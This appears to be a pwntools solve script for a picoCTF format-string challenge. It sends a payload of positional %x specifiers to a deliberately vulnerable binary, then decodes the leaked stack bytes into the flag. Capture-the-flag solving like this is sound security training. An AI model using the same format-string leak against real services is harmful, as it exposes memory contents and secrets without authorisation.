'''
tags: `format string`

use %x.%x.%x..... to check the index of the flag on stack
-> find idx of the starting point of flag
-> get all the info from after
-> get flag
'''
from pwn import *

host = 'saturn.picoctf.net'
port = 56151

elf = ELF('./vuln')

context.binary = elf
context.terminal = ['tmux', 'splitw', '-v']

gdb_script = '''
b main
'''

def conn():
    if args.EXPLOIT:
        r = remote(host, port)
    else:
        if args.LD_PRELOAD:
            import os
            r = process([elf.path], env={**os.environ, "LD_PRELOAD": args.LD_PRELOAD})
        else:
            r = process([elf.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    return r

def solve(r):
    r.recvuntil(b'>> ')
    payload = ''.join(f'%{i}$x' for i in range(55, 35, -1))
    r.sendline(payload.encode())
    r.recvuntil(b' - \n')
    flag_hex = r.recvline()
    flag = bytes.fromhex(flag_hex.decode())[::-1]
    print (flag[:flag.find(b'}') + 1].decode())

if __name__ == '__main__':
    r = conn()
    solve(r)
    r.close()